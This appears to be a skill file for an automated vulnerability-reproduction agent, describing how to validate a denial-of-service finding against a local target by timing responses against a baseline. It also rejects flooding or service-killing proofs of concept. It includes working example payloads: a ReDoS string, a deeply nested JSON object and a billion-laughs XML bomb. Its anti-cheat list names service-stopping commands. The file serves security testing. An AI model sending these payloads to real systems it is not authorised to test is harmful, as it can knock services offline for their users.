---
name: validate-dos
description: Validate denial of service by comparing a single malicious request's response time against baseline. Anti-cheat ensures the DoS is caused by a crafted payload, not concurrent flooding.
origin: vuln-analysis
---

# Validator: Denial of Service (DoS)

Confirm whether a vulnerability can make the service unavailable through a **single** crafted request, verified by response time comparison against baseline.

## When to Activate

- A DoS vulnerability needs validation during reproduction (Step 7/8)

## Prerequisites (set up before PoC execution)

```bash
# Verify the target application is running and responsive
curl -sf http://localhost:<port>/ > /dev/null || { echo "ERROR: App not responding"; exit 1; }
```

## Supported Attack Types

| Type | Description | Payload Target |
|------|-------------|---------------|
| ReDoS | Catastrophic backtracking in regex | Input fields with regex validation |
| Nested JSON | Deeply nested objects causing parser exhaustion | JSON API endpoints |
| XML bomb | Billion laughs / entity expansion | XML parsing endpoints |
| Hash collision | Crafted keys causing hash table degradation | Form/query parameters |
| Algorithmic | Input triggering worst-case algorithm | Sorting, search, graph endpoints |

## Success Criteria

| Result | Condition |
|--------|-----------|
| **[SUCCESS]** | Single request causes response time >= 10x baseline OR service becomes unresponsive AND legitimacy check passes |
| **[FAILED]** | Response time ratio < 10x and service remains responsive |
| **[INVALID]** | PoC uses concurrent flooding, manually stops the service, or sends multiple simultaneous requests |

## Validation Flow

### Step 1: Measure Baseline

```bash
# Send 3 normal requests and calculate average response time
baseline_total=0
for i in 1 2 3; do
  start=$(date +%s%N)
  curl -sf http://localhost:<port>/<endpoint> > /dev/null
  end=$(date +%s%N)
  elapsed=$(( (end - start) / 1000000 ))
  baseline_total=$((baseline_total + elapsed))
done
baseline_avg=$((baseline_total / 3))
echo "Baseline average: ${baseline_avg}ms"
```

### Step 2: Send Attack Payload

```bash
# Send single malicious request and measure response time
start=$(date +%s%N)
curl -sf --max-time 120 http://localhost:<port>/<endpoint> -d '<attack_payload>' > /dev/null 2>&1
end=$(date +%s%N)
attack_time=$(( (end - start) / 1000000 ))
echo "Attack response time: ${attack_time}ms"
```

### Step 3: Calculate Ratio

```bash
ratio=$((attack_time / baseline_avg))
echo "Ratio: ${ratio}x"
if [ "$ratio" -ge 10 ]; then
  echo "[SUCCESS]"
elif [ "$ratio" -ge 5 ]; then
  echo "[PARTIAL]"
else
  echo "[FAILED]"
fi
```

### Step 4: Check Service Degradation (MANDATORY)

**This step is required** — a DoS is only valid if the service's own availability is affected, not just that resources were consumed or held.

```bash
# After the attack, check whether the main health/index endpoint is degraded
health_start=$(date +%s%N)
curl -sf --max-time 10 http://localhost:<port>/ > /dev/null 2>&1
health_exit=$?
health_end=$(date +%s%N)
health_time=$(( (health_end - health_start) / 1000000 ))

if [ $health_exit -ne 0 ]; then
  echo "[SUCCESS] Service became unresponsive (exit $health_exit)"
elif [ "$health_time" -ge "$((baseline_avg * 5))" ]; then
  echo "[SUCCESS] Health endpoint degraded: ${health_time}ms vs baseline ${baseline_avg}ms"
else
  echo "[PARTIAL] Attack consumed resources but service remained healthy: health=${health_time}ms"
fi
```

**Critical distinction**:
- `[SUCCESS]` requires the service's own health/main endpoint to show degradation (5x+ slowdown or unresponsive)
- `[PARTIAL]` if the attack consumed resources (connections held, memory used) BUT the health endpoint still responds quickly — resource holding without service impact is NOT a confirmed DoS
- `[FAILED]` if neither the attack endpoint nor health endpoint show any degradation

**ANTI-PATTERN (observed in production runs)**: Reporting CONFIRMED when "5 connections were held for 3s avg" but "health check responded in 0.002s" — the fast health check proves the service was NOT impaired. This MUST be `[PARTIAL]`, not `[SUCCESS]`.

## Legitimacy Check (Anti-Cheat)

Scan the PoC script source code. The result is `[INVALID]` if:

- PoC uses threading/multiprocessing to send concurrent requests (`threading.Thread`, `multiprocessing.Pool`, `asyncio.gather`, `concurrent.futures`)
- PoC sends more than **one** attack request in a loop (flood pattern)
- PoC manually stops or kills the target service (`docker stop`, `kill`, `pkill`)
- PoC modifies resource limits or container settings to cause failure

**Rule**: The DoS must be demonstrated with a **single crafted request** that exploits an algorithmic or resource-handling vulnerability. Volume-based attacks (flooding) are NOT valid.

Example:
- VALID: `requests.post(target_url, json=nested_payload, timeout=120)` — single request with malicious payload
- INVALID: `for i in range(1000): requests.post(target_url, ...)` — concurrent flooding
- INVALID: `os.system("docker stop container")` — manually stopping service

## Attack Payload Examples

**ReDoS:**
```python
# Payload that triggers catastrophic backtracking
payload = "a" * 50 + "!"  # Against a vulnerable regex like (a+)+$
requests.post(target_url, data={"input": payload}, timeout=120)
```

**Nested JSON:**
```python
# Deeply nested JSON object
payload = {"a": None}
current = payload
for _ in range(10000):
    current["a"] = {"a": None}
    current = current["a"]
requests.post(target_url, json=payload, timeout=120)
```

**XML Bomb (Billion Laughs):**
```python
payload = '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><root>&lol3;</root>'
requests.post(target_url, data=payload, headers={"Content-Type": "application/xml"}, timeout=120)
```

## Confidence Scoring (1-10)

| Score | Scenario |
|-------|----------|
| 9-10 | Single request causes service crash or >= 10x response time |
| 7-8 | Significant slowdown (5-10x) from a single crafted request |
| 4-6 | Minor slowdown or requires multiple requests for impact |
| 1-3 | No observable performance impact |

**Threshold: Only mark [SUCCESS] if ratio >= 10 OR service unresponsive AND legitimacy check passed**

## Hard Exclusions

- Volume-based flooding (many concurrent requests) is NOT a valid DoS vulnerability
- Network-layer attacks (SYN flood, amplification) are NOT in scope
- Resource exhaustion requiring sustained high-volume traffic is NOT valid
- Generic "missing rate limiting" is NOT a DoS vulnerability
